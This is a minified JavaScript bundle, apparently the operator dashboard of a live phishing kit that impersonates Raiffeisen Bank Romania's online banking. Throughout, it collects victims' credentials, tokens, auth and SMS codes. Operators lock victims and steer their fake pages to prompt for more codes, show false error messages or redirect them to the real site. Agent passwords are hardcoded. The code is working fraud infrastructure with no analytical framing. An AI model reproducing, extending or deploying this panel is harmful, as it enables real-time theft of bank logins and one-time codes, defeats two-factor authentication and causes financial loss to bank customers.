(this["webpackJsonptokenka-agents"]=this["webpackJsonptokenka-agents"]||[]).push([[0],{23:function(e,t,n){e.exports=n(49)},28:function(e,t,n){},29:function(e,t,n){},49:function(e,t,n){"use strict";n.r(t);var a=n(0),r=n.n(a),c=n(21),s=n.n(c),o=(n(28),n(29),n(3)),i=n(6),l=n(7),u=n(10),d=n(9),E=n(5),m=n(4),v=n.n(m),O=n(11),f=n(22),g=n.n(f),N=n(8),_=n.n(N),p=function(){return _.a.utc().valueOf()},S=function(e,t){return Object.keys(t).reduce((function(t,n){return t[n]=e?"".concat(e,".").concat(n):"".concat(n),t}),{})},T=S(void 0,{NEW:void 0,OLD:void 0,IGNORE:void 0,IMPORTANT:void 0}),b=S("USER",{ENTER_HOMEPAGE:void 0,NEW_USER:void 0,TYPING:void 0,LOGGING:void 0,SEND_CREDENTIALS:void 0,SEND_TOKEN:void 0,SEND_AUTH_CODE:void 0,SEND_SMS:void 0,SEND_TECH_DATA:void 0}),C=(S("AGENT",{LOCK_USER:void 0}),S("INSTR",{GO_TO_HOME_SCREEN:void 0,GO_TO_TOKEN_SCREEN:void 0,GO_TO_AUTH_CODE_SCREEN:void 0,GO_TO_SMS_SCREEN:void 0,GO_TO_TECH_SCREEN:void 0,SHOW_LOADING_STATE:void 0,ERR_MSG_INVALID_CREDENTIALS:void 0,GO_TO_ORIGINAL_SITE:void 0})),k={get agent(){return JSON.parse(sessionStorage.getItem("agent"))},set agent(e){sessionStorage.setItem("agent",JSON.stringify(e))},get agents(){return[{id:1,username:"agent1",password:"1passw"},{id:2,username:"agent2",password:"2passw"},{id:7,username:"admin",password:"1admin1"}]}},h=function(e){return e.lockedBy===k.agent.id},I=function(e){return e.status===T.IMPORTANT},y=function(e){return e.status===T.IGNORE},D=Object(o.a)(Object(o.a)({},{restURL:"http://localhost:5000/token/rest",originalURL:"https://www.raiffeisenonline.ro/eBankingWeb/login"}),{},{pullingInterval:1e3}),R=D.restURL,A=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"GET",n=arguments.length>2?arguments[2]:void 0,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{updateLastActive:!0},r=a.updateLastActive,c=k.lastActive||0;return r&&(k.lastActive=p()),g()({url:"".concat(R).concat(e),method:t,data:n,headers:{"last-active":c}}).then((function(e){return e.data}))},j=D.pullingInterval,G=function(e,t){setInterval(Object(O.a)(v.a.mark((function t(){var n;return v.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,A("/agent/data");case 2:n=t.sent,e(n);case 4:case"end":return t.stop()}}),t)}))),j)},w=function(e,t){return Object(O.a)(v.a.mark((function n(){return v.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:A("/message","PUT",{userId:e,action:t}).catch((function(e){return window.alert("Error for",t.type)}));case 1:case"end":return n.stop()}}),n)})))()},L=function(e,t){return e.reduce((function(e,n){return Object(o.a)(Object(o.a)({},e),{},Object(E.a)({},n.id,function(e,t){var n=t.length&&t[t.length-1].action===b.TYPING,a=t.reduce((function(e,t){switch(t.action){case b.SEND_TOKEN:e.tokens.push(t.payload);break;case b.SEND_CREDENTIALS:e.credentials.push(t.payload)}return e}),{tokens:[],credentials:[]}),r=Object(o.a)(Object(o.a)({},e),{},{isTyping:n,tokens:a.tokens,credentials:a.credentials,messages:t});return setTimeout((function(){r.isTyping=!1}),2e3),r}(n,function(e,t){return t.filter((function(t){return t.userId===e.id}))}(n,t))))}),{})},H=n(1),M=Object(a.createContext)(),x=function(e){var t=Object(a.useState)(void 0),n=Object(H.a)(t,2),c=n[0],s=n[1];return r.a.createElement(M.Provider,{value:[c,s]},e.children)},P=function(e,t){return function(n){n.stopPropagation();var a=t?k.agent.id:void 0;A("/agent/lockUser","POST",{userId:e,agentId:a})}};function U(e){var t=e.user,n=Object(a.useContext)(M),c=Object(H.a)(n,2),s=c[0],o=c[1];return r.a.createElement("div",{className:"user ".concat(t.id===s&&"selected"," "),onClick:function(){o(t.id)}},r.a.createElement("div",{className:"user-info-descr"},r.a.createElement("div",{className:"user-id"},t.id),r.a.createElement("div",{className:"user-status ".concat(I(t)&&"important"," ").concat(y(t)&&"ignored")},t.status),r.a.createElement("div",null,t.description)),r.a.createElement("div",{className:"user-info-tokens"},r.a.createElement("div",null,"Tokens: ",r.a.createElement("b",null,t.tokens.length)),r.a.createElement("div",null,"Credentials: ",r.a.createElement("b",null,t.credentials.length))),r.a.createElement("div",{className:"user-actions"},r.a.createElement(W,{user:t})))}function W(e){var t,n=e.user,c=n.id,s=n.lockedBy,o=h(n);return r.a.createElement("div",{className:"user-lock ".concat((t=n,t.lockedBy&&"locked")," ").concat(o&&"lockedByMe")},s?r.a.createElement(a.Fragment,null,r.a.createElement("span",null,"Locked by ",r.a.createElement("b",null,o?"me":s)),o&&r.a.createElement("button",{onClick:P(c,!1)},"unlock")):r.a.createElement("button",{onClick:P(c,!0)},"lock"))}r.a.Component;function K(e){var t=e.usersData,n=Y(Object.values(t)),c=Object(a.useState)(""),s=Object(H.a)(c,2),o=s[0],i=s[1],l=$(n,o);return console.log("filtered",{sorted:n,filtered:l,filter:o}),r.a.createElement("div",{className:"users-container "},r.a.createElement(B,{filter:o,setFilter:i}),r.a.createElement("div",{className:"sidebar users "},l.map((function(e){return r.a.createElement(U,{key:e.id,user:e})}))))}function B(e){var t=e.filter,n=e.setFilter;return r.a.createElement("div",{className:"users-filter"},"Filter ",r.a.createElement("input",{type:"text",value:t,onChange:function(e){return n(e.target.value)}}),r.a.createElement("button",{onClick:function(){return n("")}},"clear"))}var F=function(e){return function(t){return e(t)?-1:1}},z=F(h),J=F(I),V=F(y),Y=function(e){return e.sort((function(e,t){var n=V(e),a=V(t);if(n!==a)return a-n;var r=z(e),c=z(t);if(r!==c)return r-c;var s=J(e),o=J(t);return s!==o?s-o:0}))},$=function(e,t){return t&&""!==t.trim()?e.filter((function(e){return e.id.toString().includes(t)||e.description&&e.description.includes(t)})):e};function q(e){var t=e.usersData,n=Object(a.useContext)(M),c=Object(H.a)(n,1)[0],s=t[c];return r.a.createElement("div",{className:"messages sidebar"},s&&r.a.createElement("div",null,r.a.createElement("div",null,r.a.createElement(U,{user:s})),r.a.createElement(Q,{messages:s.messages}),r.a.createElement(ne,{userId:c})))}function Q(e){var t=e.messages;return r.a.createElement("div",{className:"user-messages"},t&&t.map((function(e){return r.a.createElement(Z,{key:e.id,message:e})})))}var X=function(e){return e.includes("USER")};function Z(e){var t=e.message,n=t.action,a=t.payload,c=t.time;console.log("msg",{action:n,payload:a,time:c});var s=null;switch(n){case b.SEND_CREDENTIALS:case b.SEND_TOKEN:case b.SEND_AUTH_CODE:case b.SEND_SMS:case b.SEND_TECH_DATA:s=ee;break;case C.GO_TO_HOME_SCREEN:case C.GO_TO_TOKEN_SCREEN:case C.GO_TO_AUTH_CODE_SCREEN:case C.GO_TO_SMS_SCREEN:case C.GO_TO_TECH_SCREEN:case C.GO_TO_ORIGINAL_SITE:case C.ERR_MSG_INVALID_CREDENTIALS:case C.SHOW_LOADING_STATE:s=te}return s?r.a.createElement("div",{className:"".concat(X(n)?"user-msg":"agent-msg")},r.a.createElement("div",{className:"msg-item"},r.a.createElement("div",{className:"msg-time"},_()(c).format("HH:mm:ss")),r.a.createElement("div",{className:"msg-action"},r.a.createElement(s,{action:n,payload:a})))):null}function ee(e){var t,n=e.action,a=e.payload;switch(n){case b.SEND_CREDENTIALS:t="Credentials";break;case b.SEND_TOKEN:t="Token";break;case b.SEND_AUTH_CODE:t="Pers fizice Auth code";break;case b.SEND_SMS:t="Pers fizice SMS code";break;case b.SEND_TECH_DATA:t="Technical data"}return r.a.createElement("div",{className:"msg-payload"},r.a.createElement("label",null,t,":"),r.a.createElement("span",{className:"msg-payload-value"},a),r.a.createElement("button",{onClick:function(){!function(e){var t=document.createElement("textarea");t.value=e,t.setAttribute("readonly",""),t.style={position:"absolute",left:"-9999px"},document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t)}(a)}},"copy"))}function te(e){var t=e.action,n=e.payload;return r.a.createElement("div",null,r.a.createElement("label",null,t),r.a.createElement("span",{className:"msg-payload-value"},n))}function ne(e){var t=e.userId,n=Object(a.useState)(""),c=Object(H.a)(n,2),s=c[0],o=c[1];return r.a.createElement("div",{className:"agent-actions"},r.a.createElement("div",{className:"agent-actions-update-user"},r.a.createElement("div",{className:"agent-action-description"},r.a.createElement("input",{type:"text",value:s,onChange:function(e){return o(e.target.value)}}),r.a.createElement("button",{onClick:function(){return re(t,s,o)}},"add description")),r.a.createElement("div",{className:"agent-action-status"},r.a.createElement("button",{onClick:function(){return ce(t,T.IGNORE)}},"Ignore"),r.a.createElement("button",{onClick:function(){return ce(t,T.IMPORTANT)}},"Important"))),r.a.createElement("div",{className:"agent-action-instructions"},r.a.createElement("button",{onClick:function(){return w(t,{type:C.GO_TO_HOME_SCREEN})}},"Home"),r.a.createElement("button",{onClick:function(){return w(t,{type:C.GO_TO_AUTH_CODE_SCREEN})}},"Pers fizice Auth Code"),r.a.createElement("button",{onClick:function(){return w(t,{type:C.GO_TO_SMS_SCREEN})}},"Pers fizice SMS Code"),r.a.createElement("button",{onClick:function(){return w(t,{type:C.GO_TO_TECH_SCREEN})}},"Technical Works"),r.a.createElement("button",{onClick:function(){return w(t,{type:C.GO_TO_ORIGINAL_SITE})}},"Original site"),r.a.createElement("div",null,r.a.createElement(ae,{userId:t,type:C.GO_TO_TOKEN_SCREEN,text:"Token"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return w(t,{type:C.ERR_MSG_INVALID_CREDENTIALS})}},"Error Credentials"),r.a.createElement("button",{onClick:function(){return w(t,{type:C.SHOW_LOADING_STATE})}},"Show Loading ..."))))}function ae(e){var t=e.userId,n=e.type,c=e.text,s=Object(a.useState)(""),o=Object(H.a)(s,2),i=o[0],l=o[1];return r.a.createElement(a.Fragment,null,r.a.createElement("input",{type:"text",value:i,onChange:function(e){return l(e.target.value)}}),r.a.createElement("button",{onClick:function(){w(t,{type:n,payload:i}),l("")}},c))}var re=function(e,t,n){A("/agent/description","POST",{userId:e,description:t}),n("")},ce=function(e,t){A("/agent/status","POST",{userId:e,status:t})},se=function(e){Object(u.a)(n,e);var t=Object(d.a)(n);function n(){var e;return Object(i.a)(this,n),(e=t.call(this)).state={messages:[],users:[]},e}return Object(l.a)(n,[{key:"componentDidMount",value:function(){var e=this;console.log("****init"),G((function(t){var n,a,r=t.users,c=t.messages;(r.length||c.length)&&(console.log("data",{users:r,messages:c}),e.setState(Object(o.a)(Object(o.a)({},e.state),{},{users:(n=e.state.users,a=r,a.forEach((function(e){var t=n.findIndex((function(t){return t.id===e.id}));t<0?(n.push(e),setTimeout((function(){e.status===T.NEW&&(e.status=T.OLD)}),1e4)):n[t]=e})),n),messages:e.state.messages.concat(c)})))}))}},{key:"render",value:function(){var e=this.state,t=e.users,n=e.messages,a=L(t,n);return console.log("usersData",a),r.a.createElement("div",null,r.a.createElement("div",{className:"welcome"},r.a.createElement(x,null,r.a.createElement(K,{usersData:a}),r.a.createElement(q,{usersData:a}))))}}]),n}(r.a.Component);function oe(e){var t=k.agent&&ue(k.agent.username,k.agent.password),n=Object(a.useState)(t),c=Object(H.a)(n,2),s=c[0],o=c[1];return s?r.a.createElement(a.Fragment,null,e.children):r.a.createElement(ie,{setLogged:o})}function ie(e){var t=e.setLogged,n=Object(a.useState)(""),c=Object(H.a)(n,2),s=c[0],o=c[1],i=Object(a.useState)(""),l=Object(H.a)(i,2),u=l[0],d=l[1],E=Object(a.useState)(!1),m=Object(H.a)(E,2),v=m[0],O=m[1];return r.a.createElement("div",{className:"login"},r.a.createElement("div",null,r.a.createElement("input",{type:"text",value:s,onChange:function(e){return o(e.target.value)},placeholder:"username"})),r.a.createElement("div",null,r.a.createElement("input",{type:"password",value:u,onChange:function(e){return d(e.target.value)},placeholder:"password"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(e){return le(s,u,O,t)}},"login")),v&&r.a.createElement("div",{className:"error"},"Invalid Credentials"))}var le=function(e,t,n,a){var r=ue(e,t);r?(k.agent=r,n(!1),a(!0)):n(!0)},ue=function(e,t){return k.agents.find((function(n){return n.username===e&&n.password===t}))};console.log("ENV:","production");var de=function(){return r.a.createElement("div",{className:"App"},r.a.createElement(oe,null,r.a.createElement(se,null)))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(r.a.createElement(r.a.StrictMode,null,r.a.createElement(de,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()})).catch((function(e){console.error(e.message)}))}},[[23,1,2]]]);
//# sourceMappingURL=main.14212952.chunk.js.map